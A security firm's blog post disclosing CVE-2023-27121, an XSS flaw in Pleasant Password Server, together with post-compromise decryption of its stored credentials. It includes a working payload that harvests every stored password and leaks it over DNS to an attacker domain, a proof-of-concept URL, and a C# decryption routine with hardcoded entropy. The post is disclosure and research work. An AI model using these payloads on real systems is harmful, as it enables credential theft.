						<div class="service-icon">
							<img src="https://www.mdsec.co.uk/wp-content/themes/mdsec/img/icons/icon-application-security.svg" alt="Application Security">
						</div>
						<hgroup>
							<h2>
								Application <br>Security
							</h2>
						</hgroup>
						<p>Leverage the team behind the industry-leading Web Application and Mobile Hacker’s Handbook series.</p>
					</a>
				</li>
				<li class="item">
					<a href="https://www.mdsec.co.uk/our-services/penetration-testing/">
						<div class="service-icon">
							<img src="https://www.mdsec.co.uk/wp-content/themes/mdsec/img/icons/icon-penetration-testing.svg" alt="Penetration Testing">
						</div>
						<hgroup>
							<h2>
								Penetration <br>Testing
							</h2>
						</hgroup>
						<p>MDSec’s penetration testing team is trusted by companies from the world’s leading technology firms to global financial institutions.</p>
					</a>
				</li>
				<li class="item">
					<a href="https://www.mdsec.co.uk/our-services/response/">
						<div class="service-icon">
							<img src="https://www.mdsec.co.uk/wp-content/themes/mdsec/img/icons/icon-response.svg" alt="Response">
						</div>
						<hgroup>
							<h2>
								Response
							</h2>
						</hgroup>
						<p>Our certified team work with customers at all stages of the Incident Response lifecycle through our range of proactive and reactive services.</p>
					</a>
				</li>
			</ul>
		</section>		
	</div>
	<div class="subnav-kc">
		<section class="content-wrapper">
			<ul class="service-list clearfix">
				<li>
					<a href="https://www.mdsec.co.uk/knowledge-centre/research/">
						<hgroup>
							<h2>
								Research
							</h2>
						</hgroup>
						<p>MDSec&#8217;s dedicated research team periodically releases white papers, blog posts, and tooling.</p>
					</a>
				</li>
				<li>
					<a href="https://www.mdsec.co.uk/knowledge-centre/training/">
						<hgroup>
							<h2>
								Training
							</h2>
						</hgroup>
						<p>MDSec&#8217;s training courses are informed by our security consultancy and research functions, ensuring you benefit from the latest and most applicable trends in the field.</p>
					</a>
				</li>
				<li>
					<a href="https://www.mdsec.co.uk/knowledge-centre/insights/">
						<hgroup>
							<h2>
								Insights
							</h2>
						</hgroup>
						<p>View insights from MDSec&#8217;s consultancy and research teams.</p>
					</a>
				</li>
			</ul>
		</section>		
	</div>		

	
	<section class="insights-single-header">
		<div class="content-wrapper">
			<div class="the-category">
			<span class="category">ActiveBreach</span>			</div>
			<h1>The Not So Pleasant Password Manager</h1>
		</div>
	</section>

	<section class="full-width-wrapper white pad20-120">
		<div class="content-wrapper">
			<div class="breadcrumb-wrapper">
				<div id="breadcrumbs">
					<span>
						<span><a href="https://www.mdsec.co.uk/" >Home</a> &gt; 
							<span>
							<a href="https://www.mdsec.co.uk/knowledge-centre/" >Knowledge Centre</a> &gt; 
							<a href="https://www.mdsec.co.uk/knowledge-centre/insights" >Insights</a> &gt;
								<span class="breadcrumb_last" aria-current="page">The Not So Pleasant Password Manager</span>
							</span>
						</span>
					</span>
				</div>
			</div>	

		</div>
		
		<div class="insights-content">
		
<h2 class="wp-block-heading">Overview</h2>



<p>During a recent adversary simulation, the MDSec ActiveBreach red team were asked to investigate the organisation&#8217;s Password Manager solution, with the key objective of compromising stored credentials, ideally from an unauthenticated perspective.</p>



<p>As part of this engagement, <a href="https://twitter.com/au5_mate">Sean Doherty</a> &amp; <a href="https://twitter.com/TheXC3LL">Juan Manuel Fernandez</a> carried out a detailed analysis of the Password Manager solution (<a href="https://pleasantpasswords.com/">Pleasant Password Server</a>). Resulting in the identification of a reflected cross-site scripting (XSS) vulnerability, <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-27121">CVE-2023-27121</a>, that they found could be abused to leak passwords stored in the solution.</p>



<h3 class="wp-block-heading">CVE-2023-27121 &#8211; Credential Leak via XSS in Pleasant Password Manager</h3>



<p>After brief browsing of the web portal and analysis of HTTP requests, we noticed an interesting endpoint in our logs:</p>



<pre class="wp-block-code"><code>https://127.0.0.1:10001/framework/cron/action/humanize?cronString=&lt;cron expression&gt;</code></pre>



<p>This endpoint is used to convert a cron expression into a human readable string. Importantly, the content within the cronString parameter did not appear to undergo sufficient sanitisation to only permit the specific characters that would be expected in a cron expression, and the response was reflected back to the user that submitted the request.</p>



<p>In addition, this endpoint could be accessed from an unauthenticated perspective, which aids detection of vulnerable instances.</p>



<p>The below XSS PoC was used to validate the presence of the vulnerability, injecting arbitrary JavaScript into the application&#8217;s response that will cause the browser to open the Print Dialog Box:</p>



<pre class="wp-block-code"><code>https:&#47;&#47;127.0.0.1:10001/framework/cron/action/humanize?cronString=0+0+1+/%3Csvg%0Conload=print()%3E+*+SAT+*</code></pre>



<figure class="wp-block-image size-large is-style-default"><img fetchpriority="high" decoding="async" width="960" height="266" src="https://www.mdsec.co.uk/wp-content/uploads/2023/09/01-Initial-XSS-PoC-960x266.png" alt="" class="wp-image-3295" srcset="https://www.mdsec.co.uk/wp-content/uploads/2023/09/01-Initial-XSS-PoC-960x266.png 960w, https://www.mdsec.co.uk/wp-content/uploads/2023/09/01-Initial-XSS-PoC-768x213.png 768w, https://www.mdsec.co.uk/wp-content/uploads/2023/09/01-Initial-XSS-PoC-1536x426.png 1536w, https://www.mdsec.co.uk/wp-content/uploads/2023/09/01-Initial-XSS-PoC-375x104.png 375w, https://www.mdsec.co.uk/wp-content/uploads/2023/09/01-Initial-XSS-PoC.png 1561w" sizes="(max-width: 960px) 100vw, 960px" /></figure>



<p>Having identified the vulnerability, we wanted to see if we could exploit it to leak credentials from the server. Our analysis of the vulnerability identified some restrictions we had to bear in mind in when crafting our payload:</p>



<ul class="wp-block-list">
<li>We couldn&#8217;t use spaces or quotation marks in the final payload, otherwise we would break the expected format for a cron expression.</li>



<li>There was limited space for our payload, full URL needed to remain under 2100~ characters.</li>



<li>We couldn&#8217;t fetch external JS resources due to the Content Security Policy (CSP) configuration.</li>



<li>No Cross Origin Resource Sharing (CORS)</li>
</ul>



<figure class="wp-block-image size-full is-style-default"><img decoding="async" width="418" height="272" src="https://www.mdsec.co.uk/wp-content/uploads/2023/09/02-CSP-Header.png" alt="" class="wp-image-3296" srcset="https://www.mdsec.co.uk/wp-content/uploads/2023/09/02-CSP-Header.png 418w, https://www.mdsec.co.uk/wp-content/uploads/2023/09/02-CSP-Header-375x244.png 375w" sizes="(max-width: 418px) 100vw, 418px" /></figure>



<p>With this in mind, we created the following weaponised payload.</p>



<p><strong><em>WARNING: This payload only XOR &amp; Hex encodes credentials before exfiltrating over DNS &#8211; for test environments only</em></strong></p>



<pre class="wp-block-code"><code>var H='HTTPS://',U=H+'LOCALHOST:10001/WEBCLIENT/',M='MAIN/',C='CREDENTIAL',E = new TextEncoder(),Y = () =&gt; E.encode('T'),Q = (B) =&gt; new Uint8Array(E.encode(unescape(encodeURIComponent(B)))),T = (B) =&gt; Array.from(Q(B).map((C, I) =&gt; C ^ Y()&#91;I % Y().length]), V =&gt; `0${(V &amp; 0xFF).toString(16)}`.slice(-2)).join('');<br>fetch(U + M + 'GETTREE').then(R =&gt; R.json().then(F =&gt; F.forEach(F =&gt; fetch(U+C+'LISTGRID/SELECT?'+C+'GROUPID='+F.id,{method:'POST'}).then((R)=&gt;{return R.json()}).then((D)=&gt;{D&#91;'Data'].forEach(L=K=&gt;fetch(U+M+'COPYPASSWORDPOPUP?'+C+'ID='+K.Id).then((R)=&gt;{return R.json()}).then((D)=&gt;{fetch(H+T(K.Username)+"."+T(D.response)+'.1EAK.NET')}))}))));</code></pre>



<p>This payload would perform the following:</p>



<ol class="wp-block-list" type="1">
<li>Enumerate the ID of the &#8220;root&#8221; folder via a GET request to the /WEBCLIENT/MAIN/GETTREE endpoint.</li>



<li>Issue a POST request to /WEBCLIENT/CREDENTIALLISTGRID/SELECT?CREDENTIALGROUPID=&lt;ID&gt;, to retrieve a JSON array containing all the usernames and associated password IDs in the &#8220;root&#8221; folder.</li>



<li>With each of the password IDs found, perform a GET request to /WEBCLIENT/MAIN/COPYPASSWORDPOPUP?CREDENTIALID=&lt;ID&gt;, to retrieve the plaintext credential.</li>



<li>XOR encode both the username and password with a given key.</li>



<li>Hex encode the resulting values (for safe transmission).</li>



<li>Perform GET requests to an attacker controlled domain. The requests would fail, but still result in the DNS lookups containing the encoded credentials.</li>
</ol>



<p>As we had some character restrictions to get around, we char encoded the payload for it to be recovered at runtime via eval(StringfromCharCode()). See the below amended PoC:</p>



<pre class="wp-block-code"><code>https://127.0.0.1:10001/framework/cron/action/humanize?cronString=0+0+1+/%3Csvg%0Conload=eval(StringfromCharCode(&lt;CHAR PAYLOAD&gt;))%3E+*+SAT+*</code></pre>



<p>And generated a weaponized XSS payload:</p>



<figure class="wp-block-image size-large is-style-default"><img decoding="async" width="960" height="288" src="https://www.mdsec.co.uk/wp-content/uploads/2023/09/03-Generate-Weaponized-XSS-Payload-960x288.png" alt="" class="wp-image-3297" srcset="https://www.mdsec.co.uk/wp-content/uploads/2023/09/03-Generate-Weaponized-XSS-Payload-960x288.png 960w, https://www.mdsec.co.uk/wp-content/uploads/2023/09/03-Generate-Weaponized-XSS-Payload-768x231.png 768w, https://www.mdsec.co.uk/wp-content/uploads/2023/09/03-Generate-Weaponized-XSS-Payload-375x113.png 375w, https://www.mdsec.co.uk/wp-content/uploads/2023/09/03-Generate-Weaponized-XSS-Payload.png 1126w" sizes="(max-width: 960px) 100vw, 960px" /></figure>



<p>With the crafted URL prepared, it would be ready to send to a target. The below demonstrates it being executed in our lab environment:</p>



<figure class="wp-block-image size-large is-style-default"><img loading="lazy" decoding="async" width="960" height="486" src="https://www.mdsec.co.uk/wp-content/uploads/2023/09/04-Weaponized-XSS-Requests-960x486.png" alt="" class="wp-image-3298" srcset="https://www.mdsec.co.uk/wp-content/uploads/2023/09/04-Weaponized-XSS-Requests-960x486.png 960w, https://www.mdsec.co.uk/wp-content/uploads/2023/09/04-Weaponized-XSS-Requests-768x389.png 768w, https://www.mdsec.co.uk/wp-content/uploads/2023/09/04-Weaponized-XSS-Requests-1536x777.png 1536w, https://www.mdsec.co.uk/wp-content/uploads/2023/09/04-Weaponized-XSS-Requests-375x190.png 375w, https://www.mdsec.co.uk/wp-content/uploads/2023/09/04-Weaponized-XSS-Requests.png 1609w" sizes="auto, (max-width: 960px) 100vw, 960px" /></figure>



<p>And the encoded credentials were hitting our nameserver in the form of DNS queries for subdomains of our attacker controlled domain.</p>



<figure class="wp-block-image size-large is-style-default"><img loading="lazy" decoding="async" width="960" height="148" src="https://www.mdsec.co.uk/wp-content/uploads/2023/09/05-CNAME-Lookups-960x148.png" alt="" class="wp-image-3299" srcset="https://www.mdsec.co.uk/wp-content/uploads/2023/09/05-CNAME-Lookups-960x148.png 960w, https://www.mdsec.co.uk/wp-content/uploads/2023/09/05-CNAME-Lookups-768x118.png 768w, https://www.mdsec.co.uk/wp-content/uploads/2023/09/05-CNAME-Lookups-1536x237.png 1536w, https://www.mdsec.co.uk/wp-content/uploads/2023/09/05-CNAME-Lookups-375x58.png 375w, https://www.mdsec.co.uk/wp-content/uploads/2023/09/05-CNAME-Lookups.png 1539w" sizes="auto, (max-width: 960px) 100vw, 960px" /></figure>



<p>Lastly, we can then decode the leaked credentials back to plaintext:</p>



<figure class="wp-block-image size-large is-style-default"><img loading="lazy" decoding="async" width="960" height="38" src="https://www.mdsec.co.uk/wp-content/uploads/2023/09/06-Decoding-Leaked-Creds-960x38.png" alt="" class="wp-image-3300" srcset="https://www.mdsec.co.uk/wp-content/uploads/2023/09/06-Decoding-Leaked-Creds-960x38.png 960w, https://www.mdsec.co.uk/wp-content/uploads/2023/09/06-Decoding-Leaked-Creds-768x31.png 768w, https://www.mdsec.co.uk/wp-content/uploads/2023/09/06-Decoding-Leaked-Creds-375x15.png 375w, https://www.mdsec.co.uk/wp-content/uploads/2023/09/06-Decoding-Leaked-Creds.png 1079w" sizes="auto, (max-width: 960px) 100vw, 960px" /></figure>



<p>This vulnerability was identified in releases v7.11.38 &amp; v7.11.41, and remediation verified in v8.1.0.</p>



<h2 class="wp-block-heading">Alternative Technique to Recover Credentials</h2>



<p>Moving to an authenticated perspective, we decided to investigate how easy it would be to extract credentials from the solution, if the host running the service had been compromised.</p>



<p>For storing sensitive data, Pleasant Password Server supports the following databases:</p>



<ul class="wp-block-list">
<li>SQLite</li>



<li>MSSQL</li>



<li>PostgreSQL</li>
</ul>



<h3 class="wp-block-heading">Decrypting the Connection String Stored in the Registry</h3>



<p>A brief review of the installed solution resulted in the discovery of the backend database connection string being stored in the registry, though it was encrypted. <em>HKLM\SOFTWARE\Pleasant Solutions\PasswordManager\DatabaseConnectionString</em></p>



<figure class="wp-block-image size-large is-style-default"><img loading="lazy" decoding="async" width="960" height="122" src="https://www.mdsec.co.uk/wp-content/uploads/2023/09/07-Encrypted-Connection-String-in-Registry-960x122.png" alt="" class="wp-image-3301" srcset="https://www.mdsec.co.uk/wp-content/uploads/2023/09/07-Encrypted-Connection-String-in-Registry-960x122.png 960w, https://www.mdsec.co.uk/wp-content/uploads/2023/09/07-Encrypted-Connection-String-in-Registry-768x98.png 768w, https://www.mdsec.co.uk/wp-content/uploads/2023/09/07-Encrypted-Connection-String-in-Registry-375x48.png 375w, https://www.mdsec.co.uk/wp-content/uploads/2023/09/07-Encrypted-Connection-String-in-Registry.png 1046w" sizes="auto, (max-width: 960px) 100vw, 960px" /></figure>



<p>Some quick reversing and we came across logic related to decrypting the connection string in the following location:</p>



<ul class="wp-block-list">
<li>DLL: <em>C:\Program Files (x86)\Pleasant Solutions\Pleasant Password Server\www\bin\PassMan.Configuration.dll</em></li>



<li>Namespace: <em>PassMan.Configuration</em></li>



<li>Class: <em>DbConfigurationStore</em></li>



<li>Method: <em>MigrateRegistryConnectionString</em></li>
</ul>



<figure class="wp-block-image size-large is-style-default"><img loading="lazy" decoding="async" width="960" height="319" src="https://www.mdsec.co.uk/wp-content/uploads/2023/09/08-Connection-String-Encryption-Logic-960x319.png" alt="" class="wp-image-3302" srcset="https://www.mdsec.co.uk/wp-content/uploads/2023/09/08-Connection-String-Encryption-Logic-960x319.png 960w, https://www.mdsec.co.uk/wp-content/uploads/2023/09/08-Connection-String-Encryption-Logic-768x255.png 768w, https://www.mdsec.co.uk/wp-content/uploads/2023/09/08-Connection-String-Encryption-Logic-375x125.png 375w, https://www.mdsec.co.uk/wp-content/uploads/2023/09/08-Connection-String-Encryption-Logic.png 989w" sizes="auto, (max-width: 960px) 100vw, 960px" /></figure>



<p>From this, we know that the connection string is encrypted using the data protection API (DPAPI), and that it uses additional entropy, hardcoded in a <em>Constants</em> class, as shown below:</p>



<figure class="wp-block-image size-full is-style-default"><img loading="lazy" decoding="async" width="855" height="551" src="https://www.mdsec.co.uk/wp-content/uploads/2023/09/09-Additional-Entropy.png" alt="" class="wp-image-3303" srcset="https://www.mdsec.co.uk/wp-content/uploads/2023/09/09-Additional-Entropy.png 855w, https://www.mdsec.co.uk/wp-content/uploads/2023/09/09-Additional-Entropy-768x495.png 768w, https://www.mdsec.co.uk/wp-content/uploads/2023/09/09-Additional-Entropy-375x242.png 375w" sizes="auto, (max-width: 855px) 100vw, 855px" /></figure>



<p>As such, with system access we can retrieve the plaintext connection string by running a simple decryption routine on the host as an administrative user:</p>



<pre class="wp-block-code"><code>static string DecryptRegKey(string encryptedConnectionString)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; byte&#91;] additionalEntropy = { 0x9D, 0x38, 0x4A, 0xB6, 0x2D, 0x0E, 0x4E, 0x2F, 0x5A, 0x66, 0x44, 0x7B, 0x7A, 0x3E, 0x30, 0x69 };<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; try<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return Encoding.ASCII.GetString(ProtectedData.Unprotect(Convert.FromBase64String(encryptedConnectionString), additionalEntropy, DataProtectionScope.LocalMachine));<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; catch (Exception ex)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.WriteLine("&#91;X] Something went wrong: " + ex);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.WriteLine("&#91;X] Has AdditionalEntropy changed? Check PassMan.Configuration.dll Constants...");<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return null;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</code></pre>



<figure class="wp-block-image size-large is-style-default"><img loading="lazy" decoding="async" width="960" height="165" src="https://www.mdsec.co.uk/wp-content/uploads/2023/09/10-Decrypted-Connection-String-960x165.png" alt="" class="wp-image-3304" srcset="https://www.mdsec.co.uk/wp-content/uploads/2023/09/10-Decrypted-Connection-String-960x165.png 960w, https://www.mdsec.co.uk/wp-content/uploads/2023/09/10-Decrypted-Connection-String-768x132.png 768w, https://www.mdsec.co.uk/wp-content/uploads/2023/09/10-Decrypted-Connection-String-375x65.png 375w, https://www.mdsec.co.uk/wp-content/uploads/2023/09/10-Decrypted-Connection-String.png 1091w" sizes="auto, (max-width: 960px) 100vw, 960px" /></figure>



<p>Armed with this connection string, we were then able to connect to the backend DB. The below example was used to list credential sets in a MSSQL deployment:</p>



<pre class="wp-block-code"><code>SELECT Name,Username,Password FROM dbo.CredentialObject;</code></pre>



<p>However, we noticed, and expected, that all the values in the <em>Password</em> column were encrypted.</p>



<h3 class="wp-block-heading">Decrypting Passwords Stored In DB</h3>



<p>Some further reversing was performed and we came across a hardcoded string that we found was being used as the key for all crypto routines in the class:</p>



<ul class="wp-block-list">
<li>DLL: <em>C:\Program Files (x86)\Pleasant Solutions\Pleasant Password Server\www\bin\Pleasant.dll</em></li>



<li>Namespace: <em>Pleasant.Security</em></li>



<li>Class: <em>Obfuscation</em></li>
</ul>



<figure class="wp-block-image size-full is-style-default"><img loading="lazy" decoding="async" width="652" height="577" src="https://www.mdsec.co.uk/wp-content/uploads/2023/09/11-Hardcoded-AES-Key.png" alt="" class="wp-image-3305" srcset="https://www.mdsec.co.uk/wp-content/uploads/2023/09/11-Hardcoded-AES-Key.png 652w, https://www.mdsec.co.uk/wp-content/uploads/2023/09/11-Hardcoded-AES-Key-375x332.png 375w" sizes="auto, (max-width: 652px) 100vw, 652px" /></figure>



<p>In addition, we identified the methods responsible for handling encryption/decryption of the passwords in the database:</p>



<ul class="wp-block-list">
<li>DLL: <em>C:\Program Files (x86)\Pleasant Solutions\Pleasant Password Server\www\bin\Pleasant.dll</em></li>



<li>Namespace: <em>Pleasant.Security</em></li>



<li>Class: <em>Encryption</em></li>
</ul>



<figure class="wp-block-image size-full is-style-default"><img loading="lazy" decoding="async" width="507" height="157" src="https://www.mdsec.co.uk/wp-content/uploads/2023/09/12-Decryption-Logic-1.png" alt="" class="wp-image-3306" srcset="https://www.mdsec.co.uk/wp-content/uploads/2023/09/12-Decryption-Logic-1.png 507w, https://www.mdsec.co.uk/wp-content/uploads/2023/09/12-Decryption-Logic-1-375x116.png 375w" sizes="auto, (max-width: 507px) 100vw, 507px" /></figure>



<figure class="wp-block-image size-full is-style-default"><img loading="lazy" decoding="async" width="773" height="453" src="https://www.mdsec.co.uk/wp-content/uploads/2023/09/13-Decryption-Logic-2.png" alt="" class="wp-image-3307" srcset="https://www.mdsec.co.uk/wp-content/uploads/2023/09/13-Decryption-Logic-2.png 773w, https://www.mdsec.co.uk/wp-content/uploads/2023/09/13-Decryption-Logic-2-768x450.png 768w, https://www.mdsec.co.uk/wp-content/uploads/2023/09/13-Decryption-Logic-2-375x220.png 375w" sizes="auto, (max-width: 773px) 100vw, 773px" /></figure>



<p>With all the required information gathered we could now:</p>



<ul class="wp-block-list">
<li>Identify and connect to the backend database.</li>



<li>Extract all users and passwords.</li>



<li>Decrypt the passwords based on the identified logic.</li>
</ul>



<p>A utility to aid in these actions can be found on <a href="https://github.com/mdsecactivebreach/PleasantTools">GitHub</a>.</p>



<p>This blog post was written by <a href="https://twitter.com/au5_mate">Sean Doherty</a> and <a href="https://twitter.com/TheXC3LL"><a href="https://twitter.com/TheXC3LL">Juan Manuel Fernandez</a></a>.</p>
		</div>
		
		<div class="author">
			<div class="content-wrapper clearfix">
				<div class="author-avatar">
					<img alt='' src='https://secure.gravatar.com/avatar/ea6be35ff31bf7eba02c999d1d41eff2?s=96&#038;d=wp_user_avatar&#038;r=g' srcset='https://secure.gravatar.com/avatar/ea6be35ff31bf7eba02c999d1d41eff2?s=192&#038;d=wp_user_avatar&#038;r=g 2x' class='avatar avatar-96 photo' height='96' width='96' loading='lazy' decoding='async'/>				</div>
				<div class="author-meta">
					<div class="author-meta__content">
						<span>written by</span>
						<h4>MDSec Research</h4>
					</div>
				</div>
			</div>
		</div>
		<section class="testing">
	<div class="content-wrapper">
		<h2>Ready to engage<br>with MDSec?</h2>
		<div class="button">
			<a href="https://www.mdsec.co.uk/contact">
				Get in touch
			</a>
		</div>
	</div>
</section>		
	</section>




	<section class="newsletter">
	<div class="content-wrapper clearfix">
		<div class="newsletter-left">
			<p>
				Stay updated with the latest <br>news from MDSec.
			</p>
		</div>
		<div class="newsletter-right">
			<div class="frm_forms  with_frm_style frm_style_formidable-style" id="frm_form_2_container" >
<form enctype="multipart/form-data" method="post" class="frm-show-form  frm_js_validate " id="form_newslettersignupform" >
<div class="frm_form_fields ">
<fieldset>
<legend class="frm_screen_reader">Newsletter Signup Form</legend>

<div class="frm_fields_container">
<input type="hidden" name="frm_action" value="create" />
<input type="hidden" name="form_id" value="2" />
<input type="hidden" name="frm_hide_fields_2" id="frm_hide_fields_2" value="" />
<input type="hidden" name="form_key" value="newslettersignupform" />
<input type="hidden" name="item_meta[0]" value="" />
<input type="hidden" id="frm_submit_entry_2" name="frm_submit_entry_2" value="8fcc55b919" /><input type="hidden" name="_wp_http_referer" value="/2023/09/the-not-so-pleasant-password-manager/" /><div id="frm_field_10_container" class="frm_form_field form-field  frm_none_container frm_full">
    <label for="field_nkjbj" id="field_nkjbj_label" class="frm_primary_label">Email
        <span class="frm_required"></span>
    </label>
    <input type="email" id="field_nkjbj" name="item_meta[10]" value=""  placeholder="Enter your email for updates" data-invmsg="Email is invalid" aria-invalid="false"  />
    
    
</div>
<div id="frm_field_11_container" class="frm_form_field form-field  frm_none_container frm_first frm_full">
    <label for="g-recaptcha-response" id="field_ah4d8_label" class="frm_primary_label">
        <span class="frm_required"></span>
    </label>
    <div  id="field_ah4d8" class="frm-g-recaptcha" data-sitekey="6Lc27L0ZAAAAAMV4QCtKwWRbT-Hm1FnY6IKqcSxw" data-size="invisible" data-theme="light"></div>
    
    
</div>
	<input type="hidden" name="item_key" value="" />
				<div class="frm__6539d1f4bfefd">
				<label for="frm_email_2"  style="display:none;">
					If you are human, leave this field blank.				</label>
				<input  id="frm_email_2" type="text" class="frm_verify" name="frm__6539d1f4bfefd" value="" autocomplete="off"  style="display:none;" />
			</div>
		<div class="frm_submit">

<button class="frm_button_submit" type="submit"  >Submit</button>

</div></div>
</fieldset>
</div>

</form>
</div>
			
		</div>
	</div>
</section>

		</div>
	<!-- Site Wrapper End -->
	
	<!-- Footer Start -->	
	<footer>
		<div class="content-wrapper clearfix">
			<div class="footer-col">
				<div class="footer-logo">
					<a href="https://www.mdsec.co.uk" title="MDSec">
						<img src="https://www.mdsec.co.uk/wp-content/themes/mdsec/img/mdsec-logo.svg" alt="MDsec">
					</a>
				</div>
			</div>
			<div class="footer-col">
				<h3>Services</h3>
				<nav class="footer-nav">
					<ul>
						<li><a href="https://www.mdsec.co.uk/our-services/adversary-simulation/">Adversary Simulation</a></li>
						<li><a href="https://www.mdsec.co.uk/our-services/applicaton-security/">Application Security</a></li>
						<li><a href="https://www.mdsec.co.uk/our-services/penetration-testing/">Penetration Testing</a></li>
						<li><a href="https://www.mdsec.co.uk/our-services/response/">Response</a></li>
					</ul>
				</nav>
				<h3>Resource Centre</h3>
				<nav class="footer-nav">
					<ul>
						<li><a href="https://www.mdsec.co.uk/knowledge-centre/research/">Research</a></li>
						<li><a href="https://www.mdsec.co.uk/knowledge-centre/training/">Training</a></li>
						<li><a href="https://www.mdsec.co.uk/knowledge-centre/insights/">Insights</a></li>
					</ul>
				</nav>				
			</div>
			<div class="footer-col">
				<h3>Company</h3>
				<nav class="footer-nav">
					<ul>
						<li><a href="https://www.mdsec.co.uk/about/">About</a></li>
						<li><a href="https://www.mdsec.co.uk/contact/">Contact</a></li>
						<li><a href="https://www.mdsec.co.uk/careers/">Careers</a></li>
						<li><a href="https://www.mdsec.co.uk/privacy-policy/">Privacy</a></li>
					</ul>
				</nav>
				<p>
					t: +44 (0) 1625 263 503<br>
					e: <a href="mailto:contact@mdsec.co.uk">contact@mdsec.co.uk</a>
				</p>
				<p>
					32A Park Green<br>
					Macclesfield<br>
					Cheshire<br>
					SK11 7NA
				</p>
			</div>
			<div class="footer-col">
				<h3>Accreditations</h3>
				<div class="logo-list clearfix">
					<div class="logo-list__item">
						<img src="https://www.mdsec.co.uk/wp-content/themes/mdsec/img/logos/best.png" alt="Best">
					</div>
					<div class="logo-list__item">
						<img src="https://www.mdsec.co.uk/wp-content/uploads/2019/11/check-whitetrans.png" alt="IT Health Check Service">
					</div>
					<div class="logo-list__item">
						<img src="https://www.mdsec.co.uk/wp-content/themes/mdsec/img/logos/crest-star.png" alt="Crest Star">
					</div>
					<div class="logo-list__item">
						<img src="https://www.mdsec.co.uk/wp-content/themes/mdsec/img/logos/crest.png" alt="Crest">
					</div>
					<div class="logo-list__item">
						<img src="https://www.mdsec.co.uk/wp-content/themes/mdsec/img/logos/cyber-essentials.png" alt="Cyber Essentials">
					</div>
					<div class="logo-list__item">
						<img src="https://www.mdsec.co.uk/wp-content/themes/mdsec/img/logos/british-assessment-bureau.png" alt="British Assessment Bureau">
					</div>
				</div>
			</div>
		</div>
	</footer>

	<div class="end clearfix">
		<div class="end__left">
			Copyright 2025 MDSec
		</div>
		<div class="end__right">
			<!--<a href="#">Privacy Policy</a>-->
		</div>
	</div>
	<!-- Footer End -->
	
    <script type="af251fe0fdb97546bb0e0528-text/javascript" src="https://www.mdsec.co.uk/wp-includes/js/jquery/jquery.js?ver=1.11.0" id="jquery-js"></script>
<script type="af251fe0fdb97546bb0e0528-text/javascript" src="https://www.mdsec.co.uk/wp-content/themes/mdsec/js/main.js?ver=1" id="main-js"></script>
<script type="af251fe0fdb97546bb0e0528-text/javascript" src="https://www.mdsec.co.uk/wp-content/themes/mdsec/js/highlight.min.js?ver=1" id="prism-js-js"></script>
<script type="af251fe0fdb97546bb0e0528-text/javascript" src="https://www.mdsec.co.uk/wp-content/themes/mdsec/js/isotope.pkgd.min.js?ver=1" id="isotope-js-js"></script>
<script type="af251fe0fdb97546bb0e0528-text/javascript" src="https://www.mdsec.co.uk/wp-content/themes/mdsec/js/jquery.matchHeight.js?ver=1.0.0" id="matchheight-js-js"></script>
<script type="af251fe0fdb97546bb0e0528-text/javascript" src="https://www.mdsec.co.uk/wp-content/themes/mdsec/js/modernizr.js?ver=2.8.3" id="modernizr-script-js"></script>
<script type="af251fe0fdb97546bb0e0528-text/javascript" id="formidable-js-extra">
/* <![CDATA[ */
var frm_js = {"ajax_url":"https:\/\/www.mdsec.co.uk\/wp-admin\/admin-ajax.php","images_url":"https:\/\/www.mdsec.co.uk\/wp-content\/plugins\/formidable\/images","loading":"Loading\u2026","remove":"Remove","offset":"4","nonce":"e9c8b80e30","id":"ID","no_results":"No results match","file_spam":"That file looks like Spam.","calc_error":"There is an error in the calculation in the field with key","empty_fields":"Please complete the preceding required fields before uploading a file.","focus_first_error":"1","include_alert_role":"1","include_resend_email":""};
/* ]]> */
</script>
<script type="af251fe0fdb97546bb0e0528-text/javascript" src="https://www.mdsec.co.uk/wp-content/plugins/formidable/js/frm.min.js?ver=6.16.3" id="formidable-js"></script>
<script type="af251fe0fdb97546bb0e0528-text/javascript" defer="defer" async="async" src="https://www.google.com/recaptcha/api.js?onload=frmRecaptcha&amp;render=explicit&amp;ver=3" id="captcha-api-js"></script>

	<script type="af251fe0fdb97546bb0e0528-text/javascript">
		
		$grid = jQuery('.grid').isotope({
			itemSelector: '.grid-item',
			percentPosition: true,
			masonry: {
			columnWidth: '.grid-sizer',
			gutter: '.gutter-sizer',
			}
		});

		jQuery('.filter-group').on( 'click', 'li', function() {
			var filterValue = jQuery(this).attr('data-filter');
			var filterName = jQuery(this).attr('data-name');
			$grid.isotope({ filter: filterValue });
			var elems = $grid.isotope('getFilteredItemElements');
			jQuery(".sort-group-item").removeClass('active');

		});	

	</script>
	<script type="af251fe0fdb97546bb0e0528-text/javascript" src='/wp-content/themes/mdsec/jquery.marquee.min.js'></script>		
	<script type="af251fe0fdb97546bb0e0528-text/javascript">
